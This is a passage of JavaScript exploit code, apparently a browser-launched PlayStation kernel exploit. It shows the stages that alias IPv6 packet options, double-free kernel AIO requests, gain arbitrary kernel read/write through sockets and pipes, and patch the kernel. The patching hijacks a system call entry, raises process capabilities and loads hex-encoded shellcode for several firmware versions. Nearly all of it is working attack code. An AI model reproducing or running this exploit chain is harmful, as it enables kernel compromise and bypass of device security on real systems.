      gsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass);
      const marker = tclass[0];
      if (marker !== i) {
        window.log(` - Aliased pktopts at attempt: ${loop}`);
        const pair = [sds[i], sds[marker]];
        //log(`found pair: ${pair}`);
        sds.splice(marker, 1);
        sds.splice(i, 1);
        // add pktopts to the new sockets now while new allocs can't
        // use the double freed memory
        for (var j = 0; j < 2; j++) {
          const sd = new_socket();
          ssockopt(sd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
          sds.push(sd);
        }
        return pair;
      }
    }
  }
  die('failed to make aliased pktopts');
}
//================================================================================================
// STAGE DOUBLE FREE SceKernelAioRWRequest =======================================================
//================================================================================================
function double_free_reqs1(
  reqs1_addr, kbuf_addr, target_id, evf, sd, sds
) {
  const max_leak_len = (0xff + 1) << 3;
  const buf = new Buffer(max_leak_len);
  const num_elems = max_aio_ids;
  const aio_reqs = make_reqs1(num_elems);
  const aio_reqs_p = aio_reqs.addr;
  const num_batches = 2;
  const aio_ids_len = num_batches * num_elems;
  const aio_ids = new View4(aio_ids_len);
  const aio_ids_p = aio_ids.addr;
  //log('start overwrite rthdr with AIO queue entry loop');
  var aio_not_found = true;
  free_evf(evf);
  for (var i = 0; i < num_clobbers; i++) {
    spray_aio(num_batches, aio_reqs_p, num_elems, aio_ids_p);
    if (get_rthdr(sd, buf) === 8 && buf.read32(0) === AIO_CMD_READ) {
      //log(`aliased at attempt: ${i}`);
      aio_not_found = false;
      cancel_aios(aio_ids_p, aio_ids_len);
      break;
    }
    free_aios(aio_ids_p, aio_ids_len);
  }
  if (aio_not_found) {
    die('failed to overwrite rthdr');
  }
  const reqs2 = new Buffer(0x80);
  const rsize = build_rthdr(reqs2, reqs2.size);
  // .ar2_ticket
  reqs2.write32(4, 5);
  // .ar2_info
  reqs2.write64(0x18, reqs1_addr);
  // craft a aio_batch using the end portion of the buffer
  const reqs3_off = 0x28;
  // .ar2_batch
  reqs2.write64(0x20, kbuf_addr.add(reqs3_off));
  // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
  // safe since free_queue_entry() doesn't deref the pointer
  reqs2.write32(reqs3_off, 1);
  reqs2.write32(reqs3_off + 4, 0);
  // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
  reqs2.write32(reqs3_off + 8, AIO_STATE_COMPLETE);
  reqs2[reqs3_off + 0xc] = 0;
  // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
  // safe since the entry already got dequeued
  // .ar3_lock.lock_object.lo_flags = (
  //     LO_SLEEPABLE | LO_UPGRADABLE
  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
  //     | 6 << LO_CLASSSHIFT
  //     | LO_INITIALIZED
  // )
  reqs2.write32(reqs3_off + 0x28, 0x67b0000);
  // .ar3_lock.lk_lock = LK_UNLOCKED
  reqs2.write64(reqs3_off + 0x38, 1);
  const states = new View4(num_elems);
  const states_p = states.addr;
  const addr_cache = [aio_ids_p];
  for (var i = 1; i < num_batches; i++) {
    addr_cache.push(aio_ids_p.add((i * num_elems) << 2));
  }
  //log('start overwrite AIO queue entry with rthdr loop');
  var req_id = null;
  close(sd);
  sd = null;
  loop: for (var i = 0; i < num_alias; i++) {
    for (const sd of sds) {
      set_rthdr(sd, reqs2, rsize);
    }
    for (var batch = 0; batch < addr_cache.length; batch++) {
      states.fill(-1);
      aio_multi_cancel(addr_cache[batch], num_elems, states_p);
      const req_idx = states.indexOf(AIO_STATE_COMPLETE);
      if (req_idx !== -1) {
        //log(`req_idx: ${req_idx}`);
        //log(`found req_id at batch: ${batch}`);
        //log(`states: ${[...states].map(e => hex(e))}`);
        //log(`states[${req_idx}]: ${hex(states[req_idx])}`);
        //log(`aliased at attempt: ${i}`);
        const aio_idx = batch * num_elems + req_idx;
        req_id = new Word(aio_ids[aio_idx]);
        //log(`req_id: ${hex(req_id)}`);
        aio_ids[aio_idx] = 0;
        // set .ar3_done to 1
        poll_aio(req_id, states);
        //log(`states[${req_idx}]: ${hex(states[0])}`);
        for (var j = 0; j < num_sds; j++) {
          const sd2 = sds[j];
          get_rthdr(sd2, reqs2);
          const done = reqs2[reqs3_off + 0xc];
          if (done) {
            //hexdump(reqs2);
            sd = sd2;
            sds.splice(j, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
          }
        }
        if (sd === null) {
          die("can't find sd that overwrote AIO queue entry");
        }
        //log(`sd: ${sd}`);
        break loop;
      }
    }
  }
  if (req_id === null) {
    die('failed to overwrite AIO queue entry');
  }
  free_aios2(aio_ids_p, aio_ids_len);
  // enable deletion of target_id
  poll_aio(target_id, states);
  //log(`target's state: ${hex(states[0])}`);
  const sce_errs = new View4([-1, -1]);
  const target_ids = new View4([req_id, target_id]);
  // PANIC: double free on the 0x100 malloc zone. important kernel data may
  // alias
  aio_multi_delete(target_ids.addr, 2, sce_errs.addr);
  // we reclaim first since the sanity checking here is longer which makes it
  // more likely that we have another process claim the memory
  try {
    // RESTORE: double freed memory has been reclaimed with harmless data
    // PANIC: 0x100 malloc zone pointers aliased
    const sd_pair = make_aliased_pktopts(sds);
    return [sd_pair, sd];
  } finally {
    //log(`delete errors: ${hex(sce_errs[0])}, ${hex(sce_errs[1])}`);
    states[0] = -1;
    states[1] = -1;
    poll_aio(target_ids, states);
    //log(`target states: ${hex(states[0])}, ${hex(states[1])}`);
    const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
    var success = true;
    if (states[0] !== SCE_KERNEL_ERROR_ESRCH) {
      //log('ERROR: bad delete of corrupt AIO request');
      success = false;
    }
    if (sce_errs[0] !== 0 || sce_errs[0] !== sce_errs[1]) {
      //log('ERROR: bad delete of ID pair');
      success = false;
    }
    if (!success) {
      die('ERROR: double free on a 0x100 malloc zone failed');
    }
  }
}
//================================================================================================
// STAGE GET ARBITRARY KERNEL READ/WRITE =========================================================
//================================================================================================
// k100_addr is double freed 0x100 malloc zone address
// dirty_sd is the socket whose rthdr pointer is corrupt
// kernel_addr is the address of the "evf cv" string
function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
  const psd = pktopts_sds[0];
  const tclass = new Word();
  const off_tclass = is_ps4 ? 0xb0 : 0xc0;
  const pktopts = new Buffer(0x100);
  const rsize = build_rthdr(pktopts, pktopts.size);
  const pktinfo_p = k100_addr.add(0x10);
  // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
  pktopts.write64(0x10, pktinfo_p);
  //log('overwrite main pktopts');
  var reclaim_sd = null;
  close(pktopts_sds[1]);
  for (var i = 0; i < num_alias; i++) {
    for (var j = 0; j < num_sds; j++) {
      // if a socket doesn't have a pktopts, setting the rthdr will make
      // one. the new pktopts might reuse the memory instead of the
      // rthdr. make sure the sockets already have a pktopts before
      pktopts.write32(off_tclass, 0x4141 | (j << 16));
      set_rthdr(sds[j], pktopts, rsize);
    }
    gsockopt(psd, IPPROTO_IPV6, IPV6_TCLASS, tclass);
    const marker = tclass[0];
    if ((marker & 0xffff) === 0x4141) {
      window.log(` - Found reclaim sd at attempt: ${i}`);
      const idx = marker >>> 16;
      reclaim_sd = sds[idx];
      sds.splice(idx, 1);
      break;
    }
  }
  if (reclaim_sd === null) {
    die('failed to overwrite main pktopts');
  }
  const pktinfo = new Buffer(0x14);
  pktinfo.write64(0, pktinfo_p);
  const nhop = new Word();
  const nhop_p = nhop.addr;
  const read_buf = new Buffer(8);
  const read_buf_p = read_buf.addr;
  function kread64(addr) {
    const len = 8;
    var offset = 0;
    while (offset < len) {
      // pktopts.ip6po_pktinfo = addr + offset
      pktinfo.write64(8, addr.add(offset));
      nhop[0] = len - offset;
      ssockopt(psd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
      sysi(
        'getsockopt',
        psd, IPPROTO_IPV6, IPV6_NEXTHOP,
        read_buf_p.add(offset), nhop_p
      );
      const n = nhop[0];
      if (n === 0) {
        read_buf[offset] = 0;
        offset += 1;
      } else {
        offset += n;
      }
    }
    return read_buf.read64(0);
  }
  const ka = kread64(kernel_addr);
  //log(`kread64(&"evf cv"): ${kread64(kernel_addr)}`);
  const kstr = jstr(read_buf);
  //log(`*(&"evf cv"): ${kstr}`);
  if (kstr !== 'evf cv') {
    die('test read of &"evf cv" failed');
  }
  const kbase = kernel_addr.sub(off_kstr);
  //log(`kernel base: ${kbase}`);
  //log('\nmaking arbitrary kernel read/write');
  const cpuid = 7 - main_core;
  const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
  //log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
  const pcpu = kread64(pcpu_p);
  //log(`pcpu: ${pcpu}`);
  //log(`cpuid: ${kread64(pcpu.add(0x30)).hi}`);
  // __pcpu[cpuid].pc_curthread
  const td = kread64(pcpu);
  //log(`td: ${td}`);
  const off_td_proc = 8;
  const proc = kread64(td.add(off_td_proc));
  //log(`proc: ${proc}`);
  const pid = sysi('getpid');
  //log(`our pid: ${pid}`);
  const pid2 = kread64(proc.add(0xb0)).lo;
  //log(`suspected proc pid: ${pid2}`);
  if (pid2 !== pid) {
    die('process not found');
  }
  const off_p_fd = 0x48;
  const p_fd = kread64(proc.add(off_p_fd));
  //log(`proc.p_fd: ${p_fd}`);
  // curthread->td_proc->p_fd->fd_ofiles
  const ofiles = kread64(p_fd);
  //log(`ofiles: ${ofiles}`);
  const off_p_ucred = 0x40;
  const p_ucred = kread64(proc.add(off_p_ucred));
  //log(`p_ucred ${p_ucred}`);
  const pipes = new View4(2);
  sysi('pipe', pipes.addr);
  const pipe_file = kread64(ofiles.add(pipes[0] * 8));
  //log(`pipe file: ${pipe_file}`);
  // ofiles[pipe_fd].f_data
  const kpipe = kread64(pipe_file);
  //log(`pipe pointer: ${kpipe}`);
  const pipe_save = new Buffer(0x18); // sizeof struct pipebuf
  for (var off = 0; off < pipe_save.size; off += 8) {
    pipe_save.write64(off, kread64(kpipe.add(off)));
  }
  const main_sd = psd;
  const worker_sd = dirty_sd;
  const main_file = kread64(ofiles.add(main_sd * 8));
  //log(`main sock file: ${main_file}`);
  // ofiles[sd].f_data
  const main_sock = kread64(main_file);
  //log(`main sock pointer: ${main_sock}`);
  // socket.so_pcb (struct inpcb *)
  const m_pcb = kread64(main_sock.add(0x18));
  //log(`main sock pcb: ${m_pcb}`);
  // inpcb.in6p_outputopts
  const m_pktopts = kread64(m_pcb.add(0x118));
  //log(`main pktopts: ${m_pktopts}`);
  //log(`0x100 malloc zone pointer: ${k100_addr}`);
  if (m_pktopts.ne(k100_addr)) {
    die('main pktopts pointer != leaked pktopts pointer');
  }
  // ofiles[sd].f_data
  const reclaim_sock = kread64(kread64(ofiles.add(reclaim_sd * 8)));
  //log(`reclaim sock pointer: ${reclaim_sock}`);
  // socket.so_pcb (struct inpcb *)
  const r_pcb = kread64(reclaim_sock.add(0x18));
  //log(`reclaim sock pcb: ${r_pcb}`);
  // inpcb.in6p_outputopts
  const r_pktopts = kread64(r_pcb.add(0x118));
  //log(`reclaim pktopts: ${r_pktopts}`);
  // ofiles[sd].f_data
  const worker_sock = kread64(kread64(ofiles.add(worker_sd * 8)));
  //log(`worker sock pointer: ${worker_sock}`);
  // socket.so_pcb (struct inpcb *)
  const w_pcb = kread64(worker_sock.add(0x18));
  //log(`worker sock pcb: ${w_pcb}`);
  // inpcb.in6p_outputopts
  const w_pktopts = kread64(w_pcb.add(0x118));
  //log(`worker pktopts: ${w_pktopts}`);
  // get restricted read/write with pktopts pair
  // main_pktopts.ip6po_pktinfo = &worker_pktopts.ip6po_pktinfo
  const w_pktinfo = w_pktopts.add(0x10);
  pktinfo.write64(0, w_pktinfo);
  pktinfo.write64(8, 0); // clear .ip6po_nexthop
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  pktinfo.write64(0, kernel_addr);
  ssockopt(main_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  gsockopt(worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo);
  const kstr2 = jstr(pktinfo);
  //log(`*(&"evf cv"): ${kstr2}`);
  if (kstr2 !== 'evf cv') {
    die('pktopts read failed');
  }
  //log('achieved restricted kernel read/write');
  // in6_pktinfo.ipi6_ifindex must be 0 (or a valid interface index) when
  // using pktopts write. we can safely modify a pipe even with this limit so
  // we corrupt that instead for arbitrary read/write. pipe.pipe_map will be
  // clobbered with zeros but that's okay
  class KernelMemory {
    constructor(main_sd, worker_sd, pipes, pipe_addr) {
      this.main_sd = main_sd;
      this.worker_sd = worker_sd;
      this.rpipe = pipes[0];
      this.wpipe = pipes[1];
      this.pipe_addr = pipe_addr; // &pipe.pipe_buf
      this.pipe_addr2 = pipe_addr.add(0x10); // &pipe.pipe_buf.buffer
      this.rw_buf = new Buffer(0x14);
      this.addr_buf = new Buffer(0x14);
      this.data_buf = new Buffer(0x14);
      this.data_buf.write32(0xc, 0x40000000);
    }
    _verify_len(len) {
      if ((typeof len !== 'number') || !isFinite(len) || (Math.floor(len) !== len) || (len < 0) || (len > 0xffffffff)) {
        throw TypeError('len not a 32-bit unsigned integer');
      }
    }
    copyin(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write64(0, 0);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, dst);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('write', this.wpipe, src, len);
    }
    copyout(src, dst, len) {
      this._verify_len(len);
      const main = this.main_sd;
      const worker = this.worker_sd;
      const addr_buf = this.addr_buf;
      const data_buf = this.data_buf;
      addr_buf.write64(0, this.pipe_addr);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      data_buf.write32(0, 0x40000000);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, data_buf);
      addr_buf.write64(0, this.pipe_addr2);
      ssockopt(main, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      addr_buf.write64(0, src);
      ssockopt(worker, IPPROTO_IPV6, IPV6_PKTINFO, addr_buf);
      sysi('read', this.rpipe, dst, len);
    }
    _read(addr) {
      const buf = this.rw_buf;
      buf.write64(0, addr);
      buf.fill(0, 8);
      ssockopt(this.main_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
      gsockopt(this.worker_sd, IPPROTO_IPV6, IPV6_PKTINFO, buf);
    }
    read8(addr) {
      this._read(addr);
      return this.rw_buf.read8(0);
    }
    read16(addr) {
      this._read(addr);
      return this.rw_buf.read16(0);
    }
    read32(addr) {
      this._read(addr);
      return this.rw_buf.read32(0);
    }
    read64(addr) {
      this._read(addr);
      return this.rw_buf.read64(0);
    }
    write8(addr, value) {
      this.rw_buf.write8(0, value);
      this.copyin(this.rw_buf.addr, addr, 1);
    }
    write16(addr, value) {
      this.rw_buf.write16(0, value);
      this.copyin(this.rw_buf.addr, addr, 2);
    }
    write32(addr, value) {
      this.rw_buf.write32(0, value);
      this.copyin(this.rw_buf.addr, addr, 4);
    }
    write64(addr, value) {
      this.rw_buf.write64(0, value);
      this.copyin(this.rw_buf.addr, addr, 8);
    }
  }
  const kmem = new KernelMemory(main_sd, worker_sd, pipes, kpipe);
  const kstr3_buf = new Buffer(8);
  kmem.copyout(kernel_addr, kstr3_buf.addr, kstr3_buf.size);
  const kstr3 = jstr(kstr3_buf);
  //log(`*(&"evf cv"): ${kstr3}`);
  if (kstr3 !== 'evf cv') {
    die('pipe read failed');
  }
  //log('achieved arbitrary kernel read/write');
  // RESTORE: clean corrupt pointer
  // pktopts.ip6po_rthdr = NULL
  // ABC Patch
  const off_ip6po_rthdr = 0x68;
  const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
  const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
  kmem.write64(r_rthdr_p, 0);
  kmem.write64(w_rthdr_p, 0);
  //log('corrupt pointers cleaned');
  /*
  // REMOVE once restore kernel is ready for production
  // increase the ref counts to prevent deallocation
  kmem.write32(main_sock, kmem.read32(main_sock) + 1);
  kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
  // +2 since we have to take into account the fget_write()'s reference
  kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);
  */
  return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
}
//================================================================================================
// GET PATCHES ===================================================================================
//================================================================================================
async function get_patches(url) {
  const response = await fetch(url);
  if (!response.ok) {
    throw Error(`Network response was not OK, status: ${response.status}\n` + `failed to fetch: ${url}`);
  }
  return response.arrayBuffer();
}
// Convert kpatch hex string to byte array
function hex2uint8(hex) {
  const len = hex.length >> 1;
  const out = new Uint8Array(len);
  for (var i = 0, j = 0; i < len; i++, j += 2) {
    const a = hex.charCodeAt(j);
    const b = hex.charCodeAt(j + 1);
    out[i] = (((a <= 57) ? (a - 48) : (a - 87)) << 4) | ((b <= 57) ? (b - 48) : (b - 87));
  }
  return out;
}
//================================================================================================
// STAGE KERNEL PATCH ============================================================================
//================================================================================================
// Using JIT to load our own shellcode code here avoids the need to preform
// some trick toggle the CR0.WP bit. We can just toggle it easily within our
// shellcode.
async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
  if (!is_ps4) {
    throw RangeError('PS5 kernel patching unsupported');
  }
  if ((config_target < 0x600) || (config_target >= 0x1000)) {
    throw RangeError('kernel patching unsupported');
  }
  //log('change sys_aio_submit() to sys_kexec()');
  // sysent[661] is unimplemented so free for use
  const sysent_661 = kbase.add(off_sysent_661);
  //const sy_narg = kmem.read32(sysent_661);
  //const sy_call = kmem.read64(sysent_661.add(8));
  //const sy_thrcnt = kmem.read32(sysent_661.add(0x2c));
  // Save tweaks from Al-Azif's source
  const sysent_661_save = new Buffer(0x30); // sizeof syscall
  for (var off = 0; off < sysent_661_save.size; off += 8) {
    sysent_661_save.write64(off, kmem.read64(sysent_661.add(off)));
  }
  //log(`sysent[611] save addr: ${sysent_661_save.addr}`);
  //log("sysent[611] save data:");
  //hexdump(sysent_661_save);
  // .sy_narg = 6
  kmem.write32(sysent_661, 6);
  // .sy_call = gadgets['jmp qword ptr [rsi]']
  kmem.write64(sysent_661.add(8), kbase.add(jmp_rsi));
  // .sy_thrcnt = SY_THR_STATIC
  kmem.write32(sysent_661.add(0x2c), 1);
  //log('set the bits for JIT privs');
  // cr_sceCaps[0] // 0x2000038000000000
  kmem.write64(p_ucred.add(0x60), -1);
  // cr_sceCaps[1] // 0x800000000000ff00
  kmem.write64(p_ucred.add(0x68), -1);
  var kpatch_bin;
  switch (config_target) {
    case 0x700:
    case 0x701:
    case 0x702:
      const kpatch0700_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b890e9ffff41b9eb000000668981ceac6300b890e9ffff41baeb00000041bbeb040000668981c14e09004881c2d2af0600b890e9ffffc681cd0a0000ebc6818def0200ebc681d1ef0200ebc6814df00200ebc68191f00200ebc6813df20200ebc681edf60200ebc681bdf70200eb6689b1efb56300c781900400000000000066448981c604000066448989bd04000066448991b9040000c681777b0800eb66448999084c26006689817b540900c781202c2f004831c0c3c68136231d0037c68139231d0037c781705812010200000048899178581201c7819c581201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb070000c681b11b4a00eb668981ee1b4a0048b84183bfa004000000488981f71b4a00b8498bffffc681ff1b4a0090c681081c4a0087c681151c4a00b7c6812d1c4a0087c6813a1c4a00b7c681521c4a00bfc6815e1c4a00bfc6816a1c4a00bfc681761c4a00bf668981851c4a00c681871c4a00ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b1048899150d21201488b500848899158d21201488b501048899160d21201488b501848899168d21201488b502048899170d21201488b402848898178d2120131c0c34c8d40184829c2660f1f8400000000000fb630408834024883c0014939c075f0eb80";
      kpatch_bin = hex2uint8(kpatch0700_bin);
      break;
    case 0x750:
    case 0x751:
    case 0x755:
      const kpatch0750_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b890e9ffff41b9eb00000066898194736300b890e9ffff41baeb00000041bbeb040000668981041e45004881c282f60100b890e9ffffc681dd0a0000ebc6814df72800ebc68191f72800ebc6810df82800ebc68151f82800ebc681fdf92800ebc681adfe2800ebc6817dff2800eb6689b1cf7c6300c781900400000000000066448981c604000066448989bd04000066448991b9040000c68127a33700eb66448999c8143000668981c4234500c781309a02004831c0c3c6817db10d0037c68180b10d0037c781502512010200000048899158251201c7817c251201010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb030000ba050000004531c04531c9668981f5200b00be0500000048b84183bea00400000041ba01000000488981fa200b00b80400000041bb010000006689810c210b00b80400000066898119210b00b84c89ffffc78103220b00e9f2feffc68107220b00ffc78108210b00498b86d0c6810e210b0000c78115210b00498bb6b0c6811b210b0000c7812d210b00498b864066899131210b00c68133210b0000c7813a210b00498bb6206689b13e210b00c68140210b0000c78152210b00498dbec06644898156210b00c68158210b0000c7815e210b00498dbee06644898962210b00c68164210b0000c78171210b00498dbe006644899175210b00c68177210b0000c7817d210b00498dbe206644899981210b00c68183210b00006689818e210b00c68190210b00f70f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991309f1201488b5008488991389f1201488b5010488991409f1201488b5018488991489f1201488b5020488991509f1201488b4028488981589f120131c0c34c8d40184829c20f1f40000fb630408834024883c0014939c075f0eb85";
      kpatch_bin = hex2uint8(kpatch0750_bin);
      break;
    case 0x800:
    case 0x801:
    case 0x803:
      const kpatch0800_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2dc600e0066898154d26200c681cd0a0000ebc6810de12500ebc68151e12500ebc681cde12500ebc68111e22500ebc681bde32500ebc6816de82500ebc6813de92500eb6689b13fdb6200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c68196d63400eb664489918bc63e0066448999848d3100c6813f953100ebc781c05109004831c0c3c6813ad00f0037c6813dd00f0037c781e0c60f0102000000488991e8c60f01c7810cc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898141f10900b8eb06000041b90100000041ba0100000066898183f1090041bb498bffff48b84183bfa0040000004889818bf10900b8040000006689819df10900b804000000668981aaf10900b805000000c78199f10900498b87d0c6819ff1090000c781a6f10900498bb7b0c681acf1090000c781bef10900498b8740668981c2f10900c681c4f1090000c781cbf10900498bb720668991cff10900c681d1f1090000c781e3f10900498dbfc06689b1e7f10900c681e9f1090000c781eff10900498dbfe066448981f3f10900c681f5f1090000c78102f20900498dbf006644898906f20900c68108f2090000c7810ef20900498dbf206644899112f20900c68114f2090000664489991ff20900c68121f20900ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991c0401001488b5008488991c8401001488b5010488991d0401001488b5018488991d8401001488b5020488991e0401001488b4028488981e840100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0800_bin);
      break;
    case 0x850:
    case 0x852:
      const kpatch0850_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c24d7f0c0066898174466200c681cd0a0000ebc6813d403a00ebc68181403a00ebc681fd403a00ebc68141413a00ebc681ed423a00ebc6819d473a00ebc6816d483a00eb6689b15f4f6200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681d6f32200eb66448991dbd614006644899974740100c6812f7c0100ebc78140d03a004831c0c3c681ea26080037c681ed26080037c781d0c70f0102000000488991d8c70f01c781fcc70f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898121020300b8eb06000041b90100000041ba010000006689816302030041bb498bffff48b84183bfa0040000004889816b020300b8040000006689817d020300b8040000006689818a020300b805000000c78179020300498b87d0c6817f02030000c78186020300498bb7b0c6818c02030000c7819e020300498b8740668981a2020300c681a402030000c781ab020300498bb720668991af020300c681b102030000c781c3020300498dbfc06689b1c7020300c681c902030000c781cf020300498dbfe066448981d3020300c681d502030000c781e2020300498dbf0066448989e6020300c681e802030000c781ee020300498dbf2066448991f2020300c681f40203000066448999ff020300c68101030300ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991b0411001488b5008488991b8411001488b5010488991c0411001488b5018488991c8411001488b5020488991d0411001488b4028488981d841100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0850_bin);
      break;
    case 0x900:
      const kpatch0900_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c2edc5040066898174686200c681cd0a0000ebc681fd132700ebc68141142700ebc681bd142700ebc68101152700ebc681ad162700ebc6815d1b2700ebc6812d1c2700eb6689b15f716200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681061a0000eb664489918b0b080066448999c4ae2300c6817fb62300ebc781401b22004831c0c3c6812a63160037c6812d63160037c781200510010200000048899128051001c7814c051001010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c0668981015a4100b8eb06000041b90100000041ba01000000668981435a410041bb498bffff48b84183bfa0040000004889814b5a4100b8040000006689815d5a4100b8040000006689816a5a4100b805000000c781595a4100498b87d0c6815f5a410000c781665a4100498bb7b0c6816c5a410000c7817e5a4100498b8740668981825a4100c681845a410000c7818b5a4100498bb7206689918f5a4100c681915a410000c781a35a4100498dbfc06689b1a75a4100c681a95a410000c781af5a4100498dbfe066448981b35a4100c681b55a410000c781c25a4100498dbf0066448989c65a4100c681c85a410000c781ce5a4100498dbf2066448991d25a4100c681d45a41000066448999df5a4100c681e15a4100ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991007f1001488b5008488991087f1001488b5010488991107f1001488b5018488991187f1001488b5020488991207f1001488b4028488981287f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0900_bin);
      break;
    case 0x903:
    case 0x904:
      const kpatch0903_bin = "b9820000c04889f70f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb000000beeb00000041b8eb00000041b9eb00000041baeb04000041bb90e9ffff4881c29b30050066898134486200c681cd0a0000ebc6817d102700ebc681c1102700ebc6813d112700ebc68181112700ebc6812d132700ebc681dd172700ebc681ad182700eb6689b11f516200c7819004000000000000c681c2040000eb66448981b904000066448989b5040000c681061a0000eb664489918b0b08006644899994ab2300c6814fb32300ebc781101822004831c0c3c681da62160037c681dd62160037c78120c50f010200000048899128c50f01c7814cc50f01010000000f20c0480d000001000f22c00f20c04825fffffeff0f22c0b8eb480000ba0500000031f64531c066898171394100b8eb06000041b90100000041ba01000000668981b339410041bb498bffff48b84183bfa004000000488981bb394100b804000000668981cd394100b804000000668981da394100b805000000c781c9394100498b87d0c681cf39410000c781d6394100498bb7b0c681dc39410000c781ee394100498b8740668981f2394100c681f439410000c781fb394100498bb720668991ff394100c681013a410000c781133a4100498dbfc06689b1173a4100c681193a410000c7811f3a4100498dbfe066448981233a4100c681253a410000c781323a4100498dbf0066448989363a4100c681383a410000c7813e3a4100498dbf2066448991423a4100c681443a410000664489994f3a4100c681513a4100ff0f20c0480d000001000f22c0488b5708488b47104889d64c8d40014c29c64883fe0e766df30f6f000f1102488b401048894210488b471848c70000000000488b472048c70000000000488b4728488b10488991003f1001488b5008488991083f1001488b5010488991103f1001488b5018488991183f1001488b5020488991203f1001488b4028488981283f100131c0c34c8d40184829c20f1f000fb630408834024883c0014939c075f0eb86";
      kpatch_bin = hex2uint8(kpatch0903_bin);
      break;
    case 0x950:
    case 0x951:
    case 0x960:
